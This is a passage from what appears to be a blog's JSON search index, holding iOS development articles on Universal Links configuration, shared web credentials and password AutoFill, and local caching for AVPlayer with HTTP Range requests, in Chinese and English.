為陣列，可放入多組 appID，這樣就不用像以前一樣只能整個區塊重複輸入。 WWDC 有提到與舊版兼容， 當 iOS ≥ 13 有讀到新的格式就會忽略舊的 paths 。匹配規則改放在 components 中；支援 3 種類型： / ： URL ? ：Query，ex: ?name=123&amp;place=tw # ：Anchor，ex: #title並且可以搭配使用，假設今天 /user/?id=100#detail 才需要跳到 APP 則可寫成：{ \"/\": \"/user/*\", \"?\": { \"id\": \"*\" }, \"#\": \"detail\"}其中匹配語法同原本語法，也是支援 * ? ?* 。新增 comment 註解欄位，可輸入註解方便辨識。（但請注意這是公開的，別人也看得到）反向排除則改為指定 exclude: true 。新增 caseSensitive 指定功能，可指定匹配規則是否對大小寫敏感， 預設：true ，有這需求的話可以少寫許多規則。新增 percentEncoded 前面說到的，舊版需要先將網址轉為 ASCII 放到 paths 中（如果是中文字會變得很醜無法辨識）；這個參數就是是否要幫我們自動 encode， 預設是 true 。假設是中文網址就能直接放入了(ex: /客服中心 )。詳細官方文件可 參考此 。預設字符集：這算是這次更新蠻重要的功能之一，新增支援字符集。系統幫我們定義好的字符集： $(alpha) ：A-Z 和 a-z $(upper) ：A-Z $(lower) ：a-z $(alnum) ：A-Z 和 a-z 和 0–9 $(digit) ：0–9 $(xdigit) ：十六進制字符，0–9 和 a,b,c,d,e,f,A,B,C,D,E,F $(region) ：ISO 地區編碼 isoRegionCodes ，Ex: TW $(lang) ：ISO 語言編碼 isoLanguageCodes ，Ex: zh假設我們的網址有多語系，我想要支援 Universal links 時，可以這樣設定：\"components\": [ { \"/\" : \"/$(lang)-$(region)/$(food)/home\" } ]這樣不管是 /zh-TW/home 、 /en-US/home 都能支援，非常方便，不用自己寫一整排規則！自訂字符集：除了預設字符集之外，我們也能自訂字符集，增加設定檔復用、可讀性。在 applinks 中加入 substitutionVariables 即可：{ \"applinks\": { \"substitutionVariables\": { \"food\": [ \"burrito\", \"pizza\", \"sushi\", \"samosa\" ] }, \"details\": [{ \"appIDs\": [ ... ], \"components\": [ { \"/\" : \"/$(food)/\" } ] }] }}範例中自訂了一個 food 字符集，並在後續 components 中使用。以上範例可匹配 /burrito , /pizza , /sushi , /samosa 。細節可參考 此篇 官方文件。沒有靈感？如果對設定檔內容沒有靈感，可偷偷參考其他網站福的內容，只要在服務網站首頁網址加上 /app-site-association 或 /.well-known/app-site-association 即可讀取他們的設定。例如： https://www.netflix.com/apple-app-site-association補充在有使用 SceneDelegate 的情況下，open universal link 的進入點是在SceneDelegate 中：func scene(_ scene: UIScene, continue userActivity: NSUserActivity)而非 AppDelegate 的：func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([UIUserActivityRestoring]?) -&gt; Void) -&gt; Bool延伸閱讀 iOS 跨平台帳號密碼整合，加強登入體驗 iOS Deferred Deep Link 延遲深度連結實作(Swift)參考資料 What’s new in Universal Links Apple Documentation有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 15,514 Total Views Last Statistics Date: 2025-08-15 | 15,141 Views on Medium." }, { "title": "iOS 跨平台帳號密碼整合加強登入體驗", "url": "/posts/zrealm-dev/ios-%E8%B7%A8%E5%B9%B3%E5%8F%B0%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E6%95%B4%E5%90%88%E5%8A%A0%E5%BC%B7%E7%99%BB%E5%85%A5%E9%AB%94%E9%A9%97-948ed34efa09/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, password-security, web-credential, sign-in-with-apple", "date": "2021-02-02 22:13:50 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS 跨平台帳號密碼整合，加強登入體驗除 Sign in with Apple 也值得加入的功能Photo by Dan Nelson功能在同時有網站又有 APP 的服務中最常遇到的問題就是使用者在網站登入註冊過，且有記憶密...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS 跨平台帳號密碼整合，加強登入體驗除 Sign in with Apple 也值得加入的功能Photo by Dan Nelson功能在同時有網站又有 APP 的服務中最常遇到的問題就是使用者在網站登入註冊過，且有記憶密碼；但被引導安裝 APP 後，打開登入要從頭輸入帳號密碼非常不方便；此功能就是能將已存在在手機的帳號密碼自動帶入到與網站關聯的 APP 之中，加速使用者登入流程。效果圖不囉唆，先上完成效果圖；第一眼看到可能會以為是 iOS ≥ 11 Password AutoFill 功能；不過請您仔細看，鍵盤並沒有跳出來，而且我是點擊「選擇已存密碼」按鈕才跳出帳號密碼選擇視窗的。既然提到了 Password AutoFill 那就先讓我賣個關子，先介紹 Password AutoFill 和如何設置吧！Password AutoFill支援度：iOS ≥ 11到如今已經 iOS 14 了，這個功能已經非常常見沒什麼特別的；在 APP 中的帳號密碼登入頁，叫出鍵盤輸入時可以快速選擇網站版服務的帳號密碼，選擇後就能自動帶入，快速登入！那麼 APP 與 Web 之間是如何相認的呢？Associated Domains！我們在 APP 中指定 Associated Domains 並在網站上上傳 apple-app-site-association 檔案，兩邊就能相認。1.在專案設定中的「Signing &amp; Capabilities」-&gt; 左上「+ Capabilities」-&gt;「Associated Domains」新增 webcredentials:你的網站域名 (ex: webcredentials:google.com )。2.進入 蘋果開發者後台在「 Membership 」Tab 地方記錄下「 Team ID 」3.進入「Certificates, Identifiers &amp; Profiles」-&gt;「Identifiers」-&gt; 找到你的專案 -&gt; 打開「Associated Domains」功能APP 端設定完成！4.Web網站端設定建立一個名為「 apple-app-site-association 」的檔案(無副檔名)，使用文字編輯器編輯，並輸入以下內容：{ \"webcredentials\": { \"apps\": [ \"TeamID.BundleId\" ] }}將 TeamID.BundleId 換成你的專案設定 (ex: TeamID = ABCD , BundleID = li.zhgchg.demoapp =&gt; ABCD.li.zhgchg.demoapp )將此檔案上傳到網站 根目錄 或 /.well-known 目錄下，假設你的 webcredentials 網站域名 是設 google.com 則此檔案就要是 google.com/apple-app-site-association 或 google.com/.well-know/apple-app-site-association 有辦法存取到的。補充：Subdomains摘錄官方文件，如果是 subdomains 則都須列在 Associated Domains 之中。Web 端設定完成！補充：applinks這邊有發現如果有設過 universal link applinks ，其實不用再多加 webcredentials 部分也能有效果；但我們還是照文件來吧，難保之後不會有其他問題。回到程式Code 部分，我們只需要將 TextField 設為 ：usernameTextField.textContentType = .usernamepasswordTextField.textContentType = .password如果是新註冊，密碼確認欄位可使用：repeatPasswordTextField.textContentType = .newPassword這時候再重 Build &amp; Run APP 後，在輸入帳號時鍵盤上方就會出現同個網站下已存密碼的選項了。完成！沒出現？可能是沒打開自動填寫密碼功能（模擬器預設是關閉），請到「設定」-&gt;「密碼」-&gt;「自動填寫密碼」-&gt;打開「自動填寫密碼」。抑或是該網站沒有已存在的密碼，一樣可在「設定」-&gt;「密碼」-&gt; 右上角「+ 新增」-&gt; 新增。進入主題前菜 Password AutoFill 介紹完之後，再來進入本篇主題；如何達到效果圖中的效果呢。Shared Web Credentials始於 iOS 8.0 只是之前很少看到 APP 使用，早在 Password AutoFill 出來之前其實就能使用此 API 整合網站帳號密碼讓使用者快速選擇。Shared Web Credentials 除了能讀取帳號密碼，還能新增帳號密碼、對已存的帳號密碼進行修改、刪除。設定 ⚠️ 設定部分一樣要設好 Associated Domains，同前述 Password AutoFill 設定。 所以可以說是 Password AutoFill 功能的加強版！！因為一樣要先設好 Password AutoFill 需要的環境才能使用此「進階」功能。讀取讀取使用 SecRequestSharedWebCredential 方法進行操作：SecRequestSharedWebCredential(nil, nil) { (credentials, error) in guard error == nil else { DispatchQueue.main.async { //alert error } return } guard CFArrayGetCount(credentials) &gt; 0, let dict = unsafeBitCast(CFArrayGetValueAtIndex(credentials, 0), to: CFDictionary.self) as? Dictionary&lt;String, String&gt;, let account = dict[kSecAttrAccount as String], let password = dict[kSecSharedPassword as String] else { DispatchQueue.main.async { //alert error } return } DispatchQueue.main.async { //fill account,password to textfield }}SecRequestSharedWebCredential(fqdn, account, completionHandler) fqdn 如果有多個 webcredentials domain 可以指定某一個，或使用 null 不指定 account 指定要查某一個帳號，使用 null 不指定效果圖。（你可能有發現跟開始的效果圖不一樣） ⚠️ 因為此讀取方法已在 iOS 14 被標示 Deprecated！ ⚠️ 因為此讀取方法已在 iOS 14 被標示 Deprecated！ ⚠️ 因為此讀取方法已在 iOS 14 被標示 Deprecated！ \"Use ASAuthorizationController to make an ASAuthorizationPasswordRequest (AuthenticationServices framework)\"此方法僅適用 iOS 8 ~ iOS 14，iOS 13 之後可改用同 Sign in with Apple 的 API — 「 AuthenticationServices 」AuthenticationServices 讀取方式支援度 iOS ≥ 13import AuthenticationServicesclass ViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() //... let request: ASAuthorizationPasswordRequest = ASAuthorizationPasswordProvider().createRequest() let controller = ASAuthorizationController(authorizationRequests: [request]) controller.delegate = self controller.performRequests() //... }}extension ViewController: ASAuthorizationControllerDelegate { func authorizationController(controller: ASAuthorizationController, didCompleteWithAuthorization authorization: ASAuthorization) { if let credential = authorization.credential as? ASPasswordCredential { // fill credential.user, credential.password to textfield } // else if as? ASAuthorizationAppleIDCredential... sign in with apple } func authorizationController(controller: ASAuthorizationController, didCompleteWithError error: Error) { // alert error }}效果圖，可以看到新的做法在流程上、顯示上都能跟 Sign in with Apple 整合得更好。 ⚠️ 此登入無法取代 Sign in with Apple（兩個是不同東西）。寫入帳號密碼到「密碼」被 Deprecated 的只有讀取的部分，新增、刪除、編輯的部分都還是照舊能用。新增、刪除、編輯的部分使用 SecAddSharedWebCredential 進行操作。SecAddSharedWebCredential(domain as CFString, account as CFString, password as CFString?) { (error) in DispatchQueue.main.async { guard error == nil else { // alert error return } // alert success }}SecAddSharedWebCredential(fqdn, account, password, completionHandler) fqdn 可隨意指定要存入的 domain 不一定要在 webcredentials 中 account 指定要新增、修改、刪除的帳號 如果要刪除資料則將 password 帶入 nil 處理邏輯：- account 存在＆有帶入 password = 修改 password- account 存在＆password 帶入 nil = 從 domain 刪除 account, password- account 不存在＆有帶入 password = 新增 account, password 到 domain ⚠️ 另外也不是能讓你在背景偷修改的，每次修改都會跳出提示框提示使用者，使用者按「更新密碼」才會真的修改資料。密碼產生器最後一個小功能，密碼產生器。使用 SecCreateSharedWebCredentialPassword() 進行操作。let password = SecCreateSharedWebCredentialPassword() as String? ?? \"\"產生器產生出來的 Password 由英文大小寫及數字並使用「-」組成 (ex: Jpn-4t2-gaF-dYk)。完整測試專案下載美中不足如果有使用第三方密碼管理工具(EX: onepass、lastpass)的朋友可能會發現，如果是鍵盤的 Password AutoFill 能支援顯示&amp;輸入，但是在 AuthenticationServices 或 SecRequestSharedWebCredential 當中都沒有顯示出來；不確定有沒有辦法達成這個需求。結束感謝大家閱讀，也感謝 saiday 、街聲讓我知道有這個功能 XD。還有 XCode ≥ 12.5 模擬器新增錄影，並支援儲存成 GIF 功能太好用啦！在模擬器上按「Command」+「R」開始錄影，按一下紅點停止錄影；在右下角滑出的預覽圖上按「右鍵」-&gt;「Save as Animated GIF」即可存成 GIF 然後直接貼到文章內！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,880 Total Views Last Statistics Date: 2025-08-15 | 1,819 Views on Medium." }, { "title": "Enhancing Login Experience with Cross-Platform Account and Password Integration on iOS", "url": "/posts/zrealm-dev/en/enhancing-login-experience-with-cross-platform-account-and-password-integration-on-ios-948ed34efa09/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, password-security, web-credential, sign-in-with-apple", "date": "2021-02-02 22:13:50 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Enhancing Login Experience with Cross-Platform Account and Password Integration on i...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Enhancing Login Experience with Cross-Platform Account and Password Integration on iOSBesides Sign in with Apple, there are other features worth adding.Photo by Dan NelsonFeaturesA common issue encountered in services that have both a website and an app is that users may have registered and saved their passwords on the website. However, when prompted to install the app and log in, it can be very inconvenient to re-enter their username and password from scratch. This feature allows the app to automatically retrieve the existing account credentials stored on the device, speeding up the login process for users.Effect IllustrationNo fluff, here’s the completed effect illustration; at first glance, you might think it’s the iOS ≥ 11 Password AutoFill feature. However, take a closer look—the keyboard does not pop up, and I clicked the “Select Saved Password” button to bring up the account password selection window.Since we mentioned Password AutoFill, let me tease you a bit and introduce Password AutoFill and how to set it up!Password AutoFillSupport: iOS ≥ 11Now that we are on iOS 14, this feature is quite common and not particularly special; on the login page of the app, when the keyboard is called up for input, users can quickly select the account credentials from the website version, and after selection, they can be automatically filled in for a quick login!So how do the app and web recognize each other?Associated Domains! We specify Associated Domains in the app and upload the apple-app-site-association file on the website, allowing both sides to recognize each other.1. In the project settings under “Signing &amp; Capabilities” -&gt; Click the “+” in the top left -&gt; “Associated Domains”Add webcredentials:yourwebsite.com (e.g., webcredentials:google.com).2. Go to the Apple Developer AccountRecord the “Team ID” in the “Membership” tab.3. Go to “Certificates, Identifiers &amp; Profiles” -&gt; “Identifiers” -&gt; Find your project -&gt; Enable the “Associated Domains” featureAPP side setup completed!4. Web side setupCreate a file named “apple-app-site-association” (no file extension), edit it with a text editor, and enter the following content:{ \"webcredentials\": { \"apps\": [ \"TeamID.BundleId\" ] }}Replace TeamID.BundleId with your project settings (e.g., TeamID = ABCD, BundleID = li.zhgchg.demoapp =&gt; ABCD.li.zhgchg.demoapp).Upload this file to the website’s root directory or /.well-known directory. If your webcredentials website domain is set to google.com, then this file should be accessible at google.com/apple-app-site-association or google.com/.well-known/apple-app-site-association.Note: SubdomainsAccording to the official documentation, if there are subdomains, they must all be listed in the Associated Domains.Web side setup completed!Note: applinksI’ve noticed that if you have set up universal links with applinks, you actually don’t need to add the webcredentials part for it to work; but let’s stick to the documentation to avoid any future issues.Back to the CodeFor the code part, we just need to set the TextField as follows:usernameTextField.textContentType = .usernamepasswordTextField.textContentType = .passwordIf it’s a new registration, the password confirmation field can use:repeatPasswordTextField.textContentType = .newPasswordAfter rebuilding and running the app, when entering the username, options for saved passwords from the same website will appear above the keyboard.Done!Not showing up?It might be because the AutoFill Password feature is turned off (the simulator is off by default). Please go to “Settings” -&gt; “Passwords” -&gt; “AutoFill Passwords” -&gt; turn on “AutoFill Passwords”.Or it could be that there are no existing passwords for that website. You can also add one by going to “Settings” -&gt; “Passwords” -&gt; tap the “+” in the top right -&gt; add a new one.Getting to the Main TopicNow that we’ve covered the appetizer of Password AutoFill, let’s get into the main topic; how to achieve the effect shown in the illustration.Shared Web CredentialsIntroduced in iOS 8.0, this feature was rarely seen in apps before. Even before Password AutoFill was released, this API could be used to integrate website account credentials for quick selection by users.Shared Web Credentials can not only read account credentials but also add, modify, and delete existing account credentials.Setup ⚠️ The setup part must also have Associated Domains configured, just like the Password AutoFill setup mentioned earlier. So you could say this is an enhanced version of the Password AutoFill feature!!Because you still need to set up the environment required for Password AutoFill to use this “advanced” feature.ReadingReading is done using the SecRequestSharedWebCredential method:SecRequestSharedWebCredential(nil, nil) { (credentials, error) in guard error == nil else { DispatchQueue.main.async { // alert error } return } guard CFArrayGetCount(credentials) &gt; 0, let dict = unsafeBitCast(CFArrayGetValueAtIndex(credentials, 0), to: CFDictionary.self) as? Dictionary&lt;String, String&gt;, let account = dict[kSecAttrAccount as String], let password = dict[kSecSharedPassword as String] else { DispatchQueue.main.async { // alert error } return } DispatchQueue.main.async { // fill account, password to textfield }}SecRequestSharedWebCredential(fqdn, account, completionHandler) fqdn If there are multiple webcredentials domains, you can specify one, or use null to not specify. account Specify the account you want to query, use null to not specify.Effect illustration. (You may have noticed it’s different from the initial effect illustration.) ⚠️ This reading method has been marked as Deprecated in iOS 14! ⚠️ This reading method has been marked as Deprecated in iOS 14! ⚠️ This reading method has been marked as Deprecated in iOS 14! \"Use ASAuthorizationController to make an ASAuthorizationPasswordRequest (AuthenticationServices framework)\"This method is only applicable from iOS 8 to iOS 14. After iOS 13, you can use the same API as Sign in with Apple — “ AuthenticationServices”.AuthenticationServices Reading MethodSupport: iOS ≥ 13import AuthenticationServicesclass ViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() //... let request: ASAuthorizationPasswordRequest = ASAuthorizationPasswordProvider().createRequest() let controller = ASAuthorizationController(authorizationRequests: [request]) controller.delegate = self controller.performRequests() //... }}extension ViewController: ASAuthorizationControllerDelegate { func authorizationController(controller: ASAuthorizationController, didCompleteWithAuthorization authorization: ASAuthorization) { if let credential = authorization.credential as? ASPasswordCredential { // fill credential.user, credential.password to textfield } // else if as? ASAuthorizationAppleIDCredential... sign in with apple } func authorizationController(controller: ASAuthorizationController, didCompleteWithError error: Error) { // alert error }}Effect illustration, showing how the new approach integrates better with the flow and display compared to Sign in with Apple. ⚠️ This login cannot replace Sign in with Apple (the two are different things).Writing Account Credentials to “Passwords”Only the reading part has been Deprecated; the adding, deleting, and editing parts are still functional.For adding, deleting, and editing, use SecAddSharedWebCredential:SecAddSharedWebCredential(domain as CFString, account as CFString, password as CFString?) { (error) in DispatchQueue.main.async { guard error == nil else { // alert error return } // alert success }}SecAddSharedWebCredential(fqdn, account, password, completionHandler) fqdn You can specify any domain to store in, it doesn’t have to be in webcredentials. account Specify the account to add, modify, or delete. To delete data, pass nil for password. Logic handling: account exists &amp; password provided = modify password account exists &amp; password passed as nil = delete account, password from domain account does not exist &amp; password provided = add account, password to domain. ⚠️ Additionally, this does not allow you to modify in the background; each modification will prompt a dialog to notify the user, and the user must press “Update Password” for the data to be modified.Password GeneratorThe last small feature is the password generator.Use SecCreateSharedWebCredentialPassword() to operate.let password = SecCreateSharedWebCredentialPassword() as String? ?? \"\"The generated password consists of uppercase and lowercase letters and numbers, using “-“ as a separator (e.g., Jpn-4t2-gaF-dYk).Complete Test Project DownloadMinor DrawbackIf you are using third-party password management tools (e.g., 1Password, LastPass), you may notice that while the keyboard’s Password AutoFill can display and input, it does not show up in AuthenticationServices or SecRequestSharedWebCredential; it’s uncertain if this requirement can be met.ConclusionThank you all for reading, and thanks to saiday and Street Voice for letting me know about this feature XD.Also, the new recording feature in XCode ≥ 12.5 simulator, which supports saving as GIF, is incredibly useful!In the simulator, press “Command” + “R” to start recording, click the red dot to stop recording; then right-click on the preview image that slides out in the bottom right -&gt; “Save as Animated GIF” to save it as a GIF and paste it directly into the article!If you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,880 Total Views Last Statistics Date: 2025-08-15 | 1,819 Views on Medium." }, { "title": "AVPlayer 實踐本地 Cache 功能大全", "url": "/posts/zrealm-dev/avplayer-%E5%AF%A6%E8%B8%90%E6%9C%AC%E5%9C%B0-cache-%E5%8A%9F%E8%83%BD%E5%A4%A7%E5%85%A8-6ce488898003/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, cache, avplayer, music-player-app", "date": "2021-01-31 18:41:42 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.AVPlayer 實踐本地 Cache 功能大全AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegatePhoto by Tyler Las...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.AVPlayer 實踐本地 Cache 功能大全AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegatePhoto by Tyler Lastovich[2023/03/12] Update我將之前的實作開源了，有需求的朋友可直接使用。 客製化 Cache 策略，可以用 PINCache or 其他… 外部只需呼叫 make AVAsset 工廠，帶入 URL，則 AVAsset 就能支援 Caching 使用 Combine 實現 Data Flow 策略 寫了一些測試前言既上一篇「 iOS HLS Cache 實踐方法探究之旅 」後已過了大半年，團隊還是一直想要實現邊播邊 Cache 功能因為對成本的影響極大；我們是音樂串流平台，如果每次播放同樣的歌曲都要重新拿整個檔案，對我們或對非吃到飽的使用者來說都很傷流量，雖然音樂檔案頂多幾 MB，但積沙成塔都是錢！另外因為 Android 那邊已經有實作邊播邊 Cache 的功能了，之前有比較過花費，Android 端上線後明顯節省了許多流量；相對更多使用者的 iOS 應該能有更好的節流體現。根據 上一篇 的經驗，如果我們要繼續使用 HLS ( .m3u8/.ts) 來達成目的；事情將會變得非常複雜甚至無法達成；我們退而求其次退回去使用 mp3 檔，這樣就能直接使用 AVAssetResourceLoaderDelegate 進行實作。目標 播放過的音樂會在本地產生 Cache 備份 播放音樂時先檢查本地有無 Cache 讀取，有則不再重伺服器要檔案 可設 Cache 策略；上限總容量，超過時開始刪除最舊的 Cache 檔案 不干涉原本 AVPlayer 播放機制（不然最快的方法就是自己先用 URLSession 把 mp3 載下來塞給 AVPlayer，但這樣就失去原本能播到哪載到哪的功能，使用者需要等待更長時間＆更消耗流量）前導知識 (1)— HTTP/1.1 Range 範圍請求、Connection Keep-AliveHTTP/1.1 Range 範圍請求首先我們要先了解在播放影片、音樂時是怎麼跟伺服器要求資料的；一般來說影片、音樂檔案都很大，不可能等到全部拿完才開始播放常見的是播到哪拿到了，只要有正在播放區段的資料就能運作。要達到這個功能的方法就是透過 HTTP/1.1 Range 只返回指定資料字節範圍的資料，例如指定 0–100 就只返回 0–100 這 100 bytes 大小的資料；透過這個方法，可以依序分段取得資料，然後再彙整再一起成完整的檔案；這個方法也能運用在檔案下載續傳功能上。如何應用？我們會先使用 HEAD 去看 Response Header 了解到伺服器是否支援 Range 範圍請求、資源總長度、檔案類型：curl -i -X HEAD http://zhgchg.li/music.mp3使用 HEAD 我們能從 Response Header 得到以下資訊： Accept-Ranges: bytes 代表伺服器支援 Range 範圍請求如果沒有 Response 這個值或是是 Accept-Ranges: none 都代表不支援 Content-Length: 資源總長度，我們要知道總長度才能去分段要資料。 Content-Type: 檔案類型，AVPlayer 播放時需要知道的資訊。但有時我們也會使用 GET Range: bytes=0–1 ，意思是我要求 0–1 範圍的資料但實際我根本不 Care 0–1是什麼內容，我只是要看 Response Header 的資訊； 原生 AVPlayer 就是使用 GET 去看，所以本篇也照舊使用 。 但比較建議使用 HEAD 去看，一方法比較正確，另一方面萬一伺服器不支援 Range 功能；用 GET 去摸就會變強迫下載完整檔案。curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–1\"使用 GET 我們能從 Response Header 得到以下資訊： Accept-Ranges: bytes 代表伺服器支援 Range 範圍請求如果沒有 Response 這個值或是是 Accept-Ranges: none 都代表不支援 Content-Range: bytes 0–1/資源總長度 ，「/」後的數字及資源總長度，我們要知道總長度才能去分段要資料。 Content-Type: 檔案類型，AVPlayer 播放時需要知道的資訊。知道伺服器支援 Range 範圍請求後，就能分段發起範圍請求：curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–100\"伺服器會返回 206 Partial Content：Content-Range: bytes 0-100/總長度Content-Length: 100...(binary content)這時我們就得到 Range 0–100 的 Data，可再繼續發新請求拿 Range 100–200. .200–300…到結束。如果拿的 Range 超過資源總長度會返回 416 Range Not Satisfiable。另外，想拿完整檔案資料除了可以請求 Range 0-總長度，也可以使用 0- 方式即可：curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–\"其他還可以同個請求要求多個 Range 資料及下條件式子，但我們用不到，詳情可 參考這 。Connection Keep-Alivehttp 1.1 預設是開啟狀態， 此特性能實時取得已下載的資料 ，例如檔案 5 mb，能 16 kb、16 kb、16 kb… 的取得，不用等到 5mb 都好才給你。Connection: Keey-Alive如果發現伺服器不支援 Range、 Keep-Alive ？ 那也不用搞這麼多了，直接自己用 URLSession 下載完 mp3 檔案塞給播放器就好….但這不是我們要的結果，可以請後端幫忙修改伺服器設定。前導知識 (2) — AVPlayer 原生是如何處理 AVURLAsset 資源？當我們使用 AVURLAsset init with URL 資源並賦予給 AVPlayer/AVQueuePlayer 開始播放之後，同上所述，首先會用 GET Range 0–1 去取得是否支援 Range 範圍請求、資源總長度、檔案類型這三個資訊。有了檔案資訊後，會再發起第二次請求，請求從 0-總長度 的資料。 ⚠️ AVPlayer 會請求從 0-總長度 的資料，並透過實時取得已下載的資料特性 ( 16 kb、16 kb、16 kb…) 取得到他覺得資料足夠後，會發起 Cancel 取消這個網路請求 （所以實際也不會拿完，除非檔案太小）。 繼續播放後才會透過 Range 往後請求資料。 （這部分跟我之前想的不一樣，我以為會是0–100、100–200. .這樣請求）AVPlayer 請求範例：1. GET Range 0-1 =&gt; Response: 總長度 150000 / public.mp3 / true2. GET 0-150000...3. 16 kb receive4. 16 kb receive...5. cancel() // current offset is 7006. 繼續播放7. GET 700-150000...8. 16 kb receive9. 16 kb receive...10. cancel() // current offset is 150011. 繼續播放12. GET 1500-150000...13. 16 kb receive14. 16 kb receive...16. If seek to...500017. cancel(12.) // current offset is 200018. GET 5000-150000...19. 16 kb receive20. 16 kb receive...... ⚠️ iOS ≤12 的情況下，會先發幾個較短的請求試著摸摸看（？然後才會發要求到總長度的請求； iOS ≥ 13 則會直接發要求到總長度的請求。還有個題外的坑，就是在觀察怎麼拿資源的時候，我使用了 mitmproxy 工具嗅探，結果發現它顯示有錯，會等到 response 全部回來才會顯示，而不是顯示分段、使用持久連接接續下載；害我嚇了一大跳！以為 iOS 很笨居然每次都要整個檔案回來！下次要用工具時要有保持一點懷疑 OrzCancel 發起的時機 前面說到的第二次請求，請求從 0 開始 到總長度的資源，有足夠 Data 後會發起 Cancel 取消請求。 Seek 時會先發起 Cancel 取消先前的請求。 ⚠️ 在 AVQueuePlayer 中切換到下一個資源、AVPlayer 更換播放資源時並不會發起 Cancel 取消前一首的請求。AVQueue Pre-buffering其實也是同樣呼叫 Resource Loader 處理，只是他要求的資料範圍會比較小。實現有了以上前導知識後我們來看實現 AVPlayer 本地 Cache 功能的原理方式。就是之前有提到的 AVAssetResourceLoaderDelegate ，這個接口讓我們能 自行實踐 Resource Loader 給 Asset 用。Resource Loader 實際就是個打工仔，播放器是要檔案資訊還是檔案資料，範圍哪裡都哪裡都是他告訴我們，我們去做就是。 看到有範例是一個 Resource Loader 服務所有 AVURLAsset ，我覺得是錯的，應該要一個 Resource Loader 服務一個 AVURLAsset，跟著 AVURLAsset 的生命週期，他本來就屬於 AVURLAsset。 一個 Resource Loader 服務所有 AVURLAsset 在 AVQueuePlayer 上會變得非常複雜且難以管理。進入自訂的 Resource Loader 的時機點要注意的是不是實踐了自己的 Resource Loader 他就會理你，只有當系統無法辨識處理這個資源的時候，才會走你的 Resource Loader。所以我們在將 URL 資源給予 AVURLAsset 之前要先將 Scheme 換成我們自訂的 Scheme，不能是 http/https… 這些系統能處理的 Scheme。http://zhgchg.li/music.mp3 =&gt; cacheable://zhgchg.li/music.mp3AVAssetResourceLoaderDelegate只有兩個方法需要實現： func resourceLoader( _ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest : AVAssetResourceLoadingRequest) -&gt; Bool :此方法問我們能不能處理此資源，return true 能，return false 我們也不處理（unsupported url）。我們能從 loadingRequest 取出要請求什麼（第一次請求檔案資訊還是請求資料，請求資料的話 Range 是多少到多少）；知道請求後我們自行發起請求去拿資料， 在這我們就能決定要發起 URLSession 還是從本地返回 Data 。另外也能在此做 Data 加解密操作，保護原始資料。 func resourceLoader( _ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest : AVAssetResourceLoadingRequest) :前述說到的 Cancel 發起時機 發起 Cancel 時…我們可以在這去取消正在請求的 URLSession。本地 Cache 實現方式Cache 的部分我直接使用 PINCache ，將 Cache 工作交由他處理，免去我們要處理 Cache 讀寫 DeadLock、清除 Cache LRU 策略 實作上的問題。 ️️⚠️️️️️️️️️️️OOM警告！ 因為這邊是針對音樂做 Cache 檔案大小頂多 10 MB 上下，所以才能使用 PINCache 作為本地 Cache 工具；如果是要服務影片就無法使用此方法（可能一次要載入好幾 GB 的資料到記憶體）有這部分需求可參考大大的做法，用 FileHandle seek read/write 的特性進行處理。開工！不囉唆，先上完整專案：AssetData本地 Cache 資料物件映射實現 NSCoding，因 PINCache 是依賴 archivedData 方法 encode/decode。import Foundationimport CryptoKitclass AssetDataContentInformation: NSObject, NSCoding { @objc var contentLength: Int64 = 0 @objc var contentType: String = \"\" @objc var isByteRangeAccessSupported: Bool = false func encode(with coder: NSCoder) { coder.encode(self.contentLength, forKey: #keyPath(AssetDataContentInformation.contentLength)) coder.encode(self.contentType, forKey: #keyPath(AssetDataContentInformation.contentType)) coder.encode(self.isByteRangeAccessSupported, forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) } override init() { super.init() } required init?(coder: NSCoder) { super.init() self.contentLength = coder.decodeInt64(forKey: #keyPath(AssetDataContentInformation.contentLength)) self.contentType = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.contentType)) as? String ?? \"\" self.isByteRangeAccessSupported = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) as? Bool ?? false }}class AssetData: NSObject, NSCoding { @objc var contentInformation: AssetDataContentInformation = AssetDataContentInformation() @objc var mediaData: Data = Data() override init() { super.init() } func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) coder.encode(self.mediaData, forKey: #keyPath(AssetData.mediaData)) } required init?(coder: NSCoder) { super.init() self.contentInformation = coder.decodeObject(forKey: #keyPath(AssetData.contentInformation)) as? AssetDataContentInformation ?? AssetDataContentInformation() self.mediaData = coder.decodeObject(forKey: 